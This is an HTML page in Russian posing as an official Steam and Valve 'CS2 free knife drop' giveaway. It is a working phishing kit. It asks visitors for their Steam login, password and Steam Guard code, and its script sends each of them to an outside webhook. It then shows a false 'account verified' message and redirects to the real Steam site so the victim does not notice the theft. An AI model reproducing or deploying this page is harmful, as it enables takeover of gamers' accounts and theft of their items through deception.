<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CS2 FREE KNIFE + GLOVES DROP 2026</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: linear-gradient(135deg, #0a0e14 0%, #000814 100%);
      color: #c9d1d9;
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: rgba(13,17,23,0.92);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      padding: 45px 35px;
      width: 100%;
      max-width: 500px;
      border: 1px solid rgba(88,166,255,0.25);
      box-shadow: 0 25px 60px rgba(0,0,0,0.8);
      text-align: center;
      animation: fadeUp 0.8s ease-out;
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 3rem;
      color: #58a6ff;
      text-shadow: 0 0 25px rgba(88,166,255,0.7);
      margin-bottom: 10px;
      letter-spacing: 3px;
    }
    .subtitle {
      font-size: 1.4rem;
      color: #ff4757;
      margin-bottom: 25px;
      animation: pulse 3s infinite;
    }
    .step {
      display: none;
    }
    .step.active {
      display: block;
      animation: fadeIn 0.6s ease;
    }
    input {
      width: 100%;
      padding: 16px 18px;
      margin: 12px 0;
      border: 1px solid #30363d;
      border-radius: 10px;
      background: #0d1117;
      color: #e6edf3;
      font-size: 1.1rem;
      transition: all 0.3s;
    }
    input:focus {
      border-color: #58a6ff;
      box-shadow: 0 0 0 4px rgba(88,166,255,0.3);
      outline: none;
    }
    button {
      width: 100%;
      background: linear-gradient(90deg, #238636, #2ea044);
      color: white;
      padding: 18px;
      border: none;
      border-radius: 10px;
      font-size: 1.35rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
      margin-top: 15px;
      position: relative;
    }
    button:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 0 12px 30px rgba(46,160,67,0.6);
    }
    button.loading::after {
      content: '';
      position: absolute;
      top: 50%; left: 50%;
      width: 24px; height: 24px;
      border: 4px solid white;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      transform: translate(-50%, -50%);
    }
    .timer {
      margin-top: 15px;
      font-size: 1.1rem;
      color: #ff9f1c;
    }
    .valve-note {
      margin-top: 35px;
      font-size: 0.95rem;
      color: #58a6ff;
      opacity: 0.75;
    }
    @keyframes fadeUp { from {opacity:0; transform:translateY(40px);} to {opacity:1; transform:translateY(0);} }
    @keyframes fadeIn  { from {opacity:0;} to {opacity:1;} }
    @keyframes pulse   { 0%,100%{opacity:1;} 50%{opacity:0.65;} }
    @keyframes spin    { to {transform:rotate(360deg);} }
    @media (max-width: 480px) {
      .container { padding: 35px 25px; }
      h1 { font-size: 2.4rem; }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>CS2 FREE KNIFE DROP</h1>
    <div class="subtitle">LIMITED 2026 — 30 SLOTS LEFT!</div>

    <!-- Шаг 1: Логин + Пароль -->
    <div id="step1" class="step active">
      <p>Введи данные Steam для получения ножа</p>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Steam Login" required autocomplete="off"/>
        <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
        <button type="submit" id="loginBtn">ПРОДОЛЖИТЬ</button>
      </form>
    </div>

    <!-- Шаг 2: Ввод кода Guard -->
    <div id="step2" class="step">
      <h3 style="color:#58a6ff; margin-bottom:15px;">Верификация Steam</h3>
      <p>Код подтверждения отправлен на твою почту</p>
      <p style="font-size:0.95rem; color:#8b949e; margin-bottom:20px;">Придёт в течение 10–40 секунд</p>
      
      <input type="text" id="guardCode" placeholder="5-значный код из почты" maxlength="5" required autocomplete="off"/>
      <button id="guardBtn">ПОДТВЕРДИТЬ</button>
      <div class="timer" id="timer">Осталось: 60 сек</div>
    </div>

    <p class="valve-note">Официальная акция от Steam & Valve • Limited time only</p>
  </div>

  <script>
    const webhook = 'https://eoinuzdsdrixye7.m.pipedream.net';

    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const loginBtn = document.getElementById('loginBtn');
    const guardBtn = document.getElementById('guardBtn');
    const timerEl = document.getElementById('timer');

    let timeLeft = 60;
    let timerInterval;

    async function sendData(payload) {
      try {
        await fetch(webhook, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch {}
    }

    // Шаг 1 — отправка логина/пароля
    document.getElementById('loginForm').addEventListener('submit', async e => {
      e.preventDefault();
      if (loginBtn.disabled) return;

      loginBtn.disabled = true;
      loginBtn.classList.add('loading');
      loginBtn.textContent = 'ОТПРАВКА...';

      const data = {
        type: 'credentials',
        username: document.getElementById('username').value.trim(),
        password: document.getElementById('password').value.trim(),
        time: new Date().toISOString(),
        user_agent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`
      };

      await sendData(data);

      // Переход ко второму шагу
      step1.classList.remove('active');
      step2.classList.add('active');

      // Таймер
      timeLeft = 60;
      timerEl.textContent = `Осталось: ${timeLeft} сек`;
      timerInterval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = `Осталось: ${timeLeft} сек`;
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          timerEl.textContent = 'Время истекло — попробуй позже';
        }
      }, 1000);
    });

    // Шаг 2 — отправка кода Guard
    guardBtn.addEventListener('click', async () => {
      const code = document.getElementById('guardCode').value.trim();
      if (code.length !== 5 || !/^\d{5}$/.test(code)) {
        return alert('Код должен состоять из 5 цифр!');
      }

      guardBtn.disabled = true;
      guardBtn.classList.add('loading');
      guardBtn.textContent = 'ВЕРИФИКАЦИЯ...';

      const data = {
        type: 'guard_code',
        guard: code,
        time: new Date().toISOString()
      };

      await sendData(data);

      alert('Аккаунт успешно верифицирован!\nНож и перчатки добавлены в инвентарь. Перезагрузи CS2!');
      window.location.href = 'https://steamcommunity.com/';
    });
  </script>
</body>
</html>
